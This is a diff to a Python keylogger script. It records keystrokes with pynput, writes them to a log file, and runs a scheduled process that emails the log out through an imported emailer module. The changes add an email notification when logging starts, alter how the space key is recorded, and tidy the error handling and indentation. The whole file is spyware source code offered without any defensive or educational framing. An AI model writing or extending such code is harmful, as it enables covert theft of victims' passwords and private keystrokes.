@@ -1,12 +1,10 @@
 from pynput import keyboard, mouse
 import os
 import datetime
-from emailer import send_log
+from emailer import send_log, send_application_start_message
 import schedule
 import time
 from multiprocessing import Process
-
-
 
 
 def on_press(key):
@@ -19,7 +17,7 @@ def on_press(key):
     except AttributeError:
         # print('special key {0} pressed'.format(key))
         if key == keyboard.Key.space:
-            f.write('•')
+            f.write('|')
             return
         if key == keyboard.Key.enter:
             f.write(os.linesep)
@@ -33,11 +31,15 @@ def on_press(key):
 
 
 def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
+    try:
+        if key == keyboard.Key.esc:
+            return False
+    except AttributeError:
+        return True
 
 
 def logging():
+    send_application_start_message()
     print("LOGGING")
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
@@ -52,8 +54,7 @@ def emailSending():
 
 
 if __name__ == '__main__':
-  p2 = Process(target=emailSending)
-  p2.start()
-  logging()
-  p2.join()
-
+    p2 = Process(target=emailSending)
+    p2.start()
+    logging()
+    p2.join()
